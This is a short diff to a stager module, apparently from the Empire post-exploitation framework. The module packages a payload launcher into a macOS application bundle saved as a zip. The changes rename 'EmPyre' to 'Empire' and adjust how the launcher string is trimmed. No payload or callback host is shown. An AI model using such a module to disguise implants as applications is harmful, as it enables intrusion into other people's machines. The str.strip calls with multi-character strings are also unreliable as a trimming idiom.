@@ -10,7 +10,7 @@ class Stager:
 
             'Author': ['@xorrior'],
 
-            'Description': ('Generates an EmPyre Application.'),
+            'Description': ('Generates an Empire Application.'),
 
             'Comments': [
                 ''
@@ -42,7 +42,7 @@ class Stager:
                 'Value'         :   ''
             },
             'OutFile' : {
-                'Description'   :   'path to output EmPyre application. The application will be saved to a zip file.',
+                'Description'   :   'path to output Empire application. The application will be saved to a zip file.',
                 'Required'      :   True,
                 'Value'         :   '/tmp/out.zip'
             },
@@ -95,6 +95,6 @@ class Stager:
 
         else:
             disarm = False
-            launcher = launcher.strip('echo').strip(' | python &').strip("\"")
+            launcher = launcher.strip('echo').strip(' | /usr/bin/python &').strip("\"")
             ApplicationZip = self.mainMenu.stagers.generate_appbundle(launcherCode=launcher,Arch=arch,icon=icnsPath,AppName=AppName, disarm=disarm)
             return ApplicationZip
